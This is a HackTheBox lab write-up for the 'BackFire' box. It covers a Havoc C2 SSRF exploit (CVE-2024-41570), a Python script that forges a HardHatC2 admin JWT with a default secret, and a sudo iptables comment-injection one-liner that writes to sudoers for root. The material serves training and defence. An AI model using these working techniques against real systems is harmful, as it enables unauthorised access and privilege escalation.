---
title: "BackFire"
type: docs
tags:
  - htb
  - linux
  - medium
  - c2
  - havoc
  - hardhatc2
  - cve-2024-41570
  - jwt
  - gtfobins
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux, **Difficulty:** Medium, **IP:** 10.10.11.49

</div>

<div class="callout callout-abstract">

**Attack Path**

1. Port 8000 leaks a **Havoc C2** profile with the team-server password.
2. Exploit **CVE-2024-41570** (Havoc team-server SSRF via unauthenticated demon registration) → interact with internal services → shell.
3. Backend kills the shell; use `ilya:CobaltStr1keSuckz!` (from the profile) + a self-generated SSH key to log in as **ilya**.
4. `hardhat.txt` reveals a second C2, **HardHatC2** on localhost:5000. Forge an admin **JWT** (hard-coded HS256 secret) → register a user → C2 terminal → shell as **sergej**.
5. `sergej` may `sudo iptables` / `iptables-save`, abuse `--comment` to inject a sudoers line and `iptables-save -f /etc/sudoers.d/…` , `sudo /bin/bash` , root.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| Havoc profile | `ilya : CobaltStr1keSuckz!` |
| HardHatC2 JWT secret (default) | `jtee43gt-6543-2iur-9422-83r5w27hgzaq` |
| `user.txt` | `/home/ilya/user.txt` |
| `root.txt` | `/root/root.txt` |

</div>

---

## Overview

BackFire is a red team themed box: the whole path is turning **offensive tooling against its operator**. Port 8000 leaks a **Havoc C2** profile, which is exploited via **CVE-2024-41570** (an unauthenticated SSRF in the Havoc teamserver reachable through the demon registration endpoint). Then a second framework, **HardHatC2**, is running on localhost with its **default JWT signing secret**, so you forge an Administrator token and register yourself an operator account with a built in terminal. Root is a neat `sudo iptables` abuse: `iptables-save` will write the current ruleset to any file, and a rule `--comment` can contain newlines, so you smuggle a `sudoers` line into a comment and dump it into `/etc/sudoers.d/`.

Related JWT forgery with a known/weak secret: [Rabbit Store](/writeups/tryhackme/linux/medium/rabbit-store/). Related "config file leaks a service password": [Monitored](/writeups/hackthebox/linux/medium/monitored/), [Heal](/writeups/hackthebox/linux/medium/heal/). Related GTFOBins style `sudo` binary abuse: [Lookup](/writeups/tryhackme/linux/easy/lookup/), [Bagel](/writeups/hackthebox/linux/medium/bagel/), [Dog](/writeups/hackthebox/linux/easy/dog/).

## Reconnaissance

```console
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
443/tcp  open  ssl/http nginx 1.22.1
|   X-Havoc: true
8000/tcp open  http     nginx 1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Port **8000** serves two files, one a **Havoc C2** config with credentials.

## Foothold, Havoc CVE-2024-41570 (SSRF)

```bash
python3 exploit.py -t https://10.10.11.49/ -i 127.0.0.1 -p 40056
```

```console
[***] Trying to register agent...
[***] Success!
[***] Trying to open socket on the teamserver...
[***] Success!
```

The shell is unstable (backend kills it), so pivot to SSH as **ilya** using the profile creds and a fresh key:

```bash
ssh-keygen -f ./id_rsa -N ''
# append id_rsa.pub to /home/ilya/.ssh/authorized_keys via the shell
ssh -i id_rsa ilya@backfire.htb        # ilya:CobaltStr1keSuckz!
```

## ilya → sergej (HardHatC2 JWT forgery)

```text
$ cat hardhat.txt
Sergej said he installed HardHatC2 for testing and not made any changes to the defaults
```

Forward the C2 admin API and forge an admin token with the default secret:

```bash
ssh -L 5000:localhost:5000 -i id_rsa ilya@backfire.htb
```

```python
import jwt, datetime, uuid, requests

rhost = '127.0.0.1:5000'
secret = "jtee43gt-6543-2iur-9422-83r5w27hgzaq"     # hard-coded default
issuer = "hardhatc2.com"
now = datetime.datetime.utcnow()

payload = {
    "sub": "HardHat_Admin",
    "jti": str(uuid.uuid4()),
    "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier": "1",
    "iss": issuer, "aud": issuer,
    "iat": int(now.timestamp()),
    "exp": int((now + datetime.timedelta(days=28)).timestamp()),
    "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Administrator",
}
token = jwt.encode(payload, secret, algorithm="HS256")

requests.post(f"https://{rhost}/Login/Register",
              headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"},
              json={"username": "sth_pentest", "password": "sth_pentest", "role": "TeamLead"},
              verify=False)
```

Log into HardHatC2 as `sth_pentest`, open the **Terminal** tab, and run a reverse shell → **sergej**.

## sergej → root (sudo iptables comment injection)

```console
$ sudo -l
sergej ALL=NOPASSWD: /usr/sbin/iptables
sergej ALL=NOPASSWD: /usr/sbin/iptables-save
```

Smuggle a sudoers entry through an iptables rule comment, then dump the ruleset into `sudoers.d`:

```bash
sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\nsergej ALL=NOPASSWD: /bin/bash\n' \
  && sudo iptables -S \
  && sudo iptables-save -f /etc/sudoers.d/plswork
```

```console
$ sudo -l
User sergej may run the following commands on backfire:
    (root) NOPASSWD: /usr/sbin/iptables
    (root) NOPASSWD: /usr/sbin/iptables-save
    (root) NOPASSWD: /bin/bash
```

```bash
sudo /bin/bash        # root
cat /root/root.txt
```

<div class="callout callout-note">

**Why the iptables trick works**

`sudo -l` allows `iptables` and `iptables-save`. `iptables-save -f <file>` writes the current ruleset to an arbitrary path as root, so the target is `/etc/sudoers.d/`. But the saved format is iptables syntax, not sudoers, so the file would be invalid, except `sudo` and the sudoers parser **ignore lines they cannot parse** and still apply the valid ones. A rule `--comment` can hold arbitrary bytes including `\n`, so `--comment $'\nsergej ALL=NOPASSWD: /bin/bash\n'` makes `iptables-save` emit that line on its own, and the sudoers parser picks it up while skipping the iptables noise around it.

</div>

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/ilya/user.txt` |
| `root.txt` | `/root/root.txt` |

---

## Lessons and Takeaways

- **C2 profiles and configs are credentials.** Do not leave a Havoc/Cobalt/Sliver profile on a web path, and change every default password.
- **Patch your tooling.** CVE-2024-41570 is unauthenticated RCE against the Havoc teamserver. Offensive infra needs the same patch discipline as anything else.
- **Never ship a framework with a hardcoded JWT secret.** HardHatC2's default `jtee43gt-...` lets anyone mint an admin token. Generate a random secret at install.
- **`sudo iptables` / `iptables-save` is root.** `iptables-save -f` is an arbitrary file write. Do not grant it, or wrap it in a script that fixes the output path.
- **Isolate red team infrastructure.** Two C2 frameworks on one host, one internet facing, is how the operator gets popped.

---

## Related Writeups

- **JWT forgery (weak / known secret):** [Rabbit Store](/writeups/tryhackme/linux/medium/rabbit-store/)
- **Service password in a config file:** [Monitored](/writeups/hackthebox/linux/medium/monitored/), [Heal](/writeups/hackthebox/linux/medium/heal/), [Bolt](/writeups/hackthebox/linux/medium/bolt/)
- **`sudo` binary abuse (GTFOBins style):** [Lookup](/writeups/tryhackme/linux/easy/lookup/), [Bagel](/writeups/hackthebox/linux/medium/bagel/), [Dog](/writeups/hackthebox/linux/easy/dog/)
- **SSRF to internal service:** [Forge](/writeups/hackthebox/linux/medium/forge/), [Stocker](/writeups/hackthebox/linux/easy/stocker/)

## References

- CVE-2024-41570 (Havoc SSRF/RCE) <https://github.com/chebuya/Havoc-C2-SSRF-poc>
- HardHatC2 default secret advisory <https://github.com/DragoQCC/HardHatC2>
- GTFOBins iptables <https://gtfobins.github.io/gtfobins/iptables/>
- jwt.io <https://jwt.io/>
